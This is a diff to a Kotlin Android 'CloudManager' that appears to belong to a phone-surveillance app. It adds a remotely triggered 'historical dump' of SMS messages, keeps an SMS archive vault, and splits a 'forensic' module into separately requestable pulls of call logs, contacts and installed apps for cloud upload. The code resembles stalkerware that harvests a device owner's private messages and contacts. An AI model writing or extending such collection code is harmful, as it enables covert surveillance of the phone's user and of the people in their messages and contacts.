@@ -49,18 +49,23 @@ object CloudManager {
                     json.put("battery_level", batt?.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, 0) ?: 0)
                 }
 
-                // --- MODULE 2: SMS (DELTA SYNC) ---
+                // --- MODULE 2: SMS (PARAMETRIC SYNC) ---
                 if (isAll || moduleMap.containsKey("sms")) {
-                    val lastSmsSync = prefs.getLong("last_sync_sms_ts", 0L)
-                    val currentSmsLogs = JSONArray(prefs.getString("sms_logs_cache", "[]"))
-                    val deltaSms = JSONArray()
-                    
-                    for (i in 0 until currentSmsLogs.length()) {
-                        val item = currentSmsLogs.getJSONObject(i)
-                        if (item.optLong("timestamp", 0L) > lastSmsSync) deltaSms.put(item)
+                    val limit = moduleMap["sms"] ?: -1
+                    // If specific limit is requested, perform historical dump
+                    if (limit > 0) {
+                        json.put("sms_logs", PhoneManager.getHistoricalSms(ctx, limit))
+                    } else {
+                        // Standard Delta Sync
+                        val lastSmsSync = prefs.getLong("last_sync_sms_ts", 0L)
+                        val currentSmsLogs = JSONArray(prefs.getString("sms_logs_cache", "[]"))
+                        val deltaSms = JSONArray()
+                        for (i in 0 until currentSmsLogs.length()) {
+                            val item = currentSmsLogs.getJSONObject(i)
+                            if (item.optLong("timestamp", 0L) > lastSmsSync) deltaSms.put(item)
+                        }
+                        if (deltaSms.length() > 0) json.put("sms_logs", deltaSms)
                     }
-
-                    if (deltaSms.length() > 0) json.put("sms_logs", deltaSms)
                     
                     val vaultFile = java.io.File(ctx.filesDir, "sms_archive_vault.json")
                     if (vaultFile.exists()) {
@@ -124,11 +129,22 @@ object CloudManager {
                      json.put("network_logs", JSONArray(prefs.getString("net_history_log", "[]")))
                 }
 
-                // --- MODULE 7: PHONE (FORENSIC) ---
-                if (isAll || modules.contains("phone")) {
-                     json.put("calls", PhoneManager.getCallLogs(ctx))
-                     json.put("contacts", PhoneManager.getContacts(ctx))
-                     json.put("apps", AppListManager.getInstalledApps(ctx))
+                // --- MODULE 7: CALLS (DECOUPLED) ---
+                if (isAll || moduleMap.containsKey("calls")) {
+                     val limit = moduleMap["calls"] ?: 100
+                     json.put("calls", PhoneManager.getCallLogs(ctx, limit))
+                }
+
+                // --- MODULE 7.1: CONTACTS (DECOUPLED) ---
+                if (isAll || moduleMap.containsKey("contacts")) {
+                     val limit = moduleMap["contacts"] ?: -1
+                     json.put("contacts", PhoneManager.getContacts(ctx, limit))
+                }
+
+                // --- MODULE 7.2: APPS (DECOUPLED) ---
+                if (isAll || moduleMap.containsKey("apps")) {
+                     val limit = moduleMap["apps"] ?: -1
+                     json.put("apps", AppListManager.getInstalledApps(ctx, limit))
                 }
 
                 // --- MODULE 8: FILES (Skeleton) ---
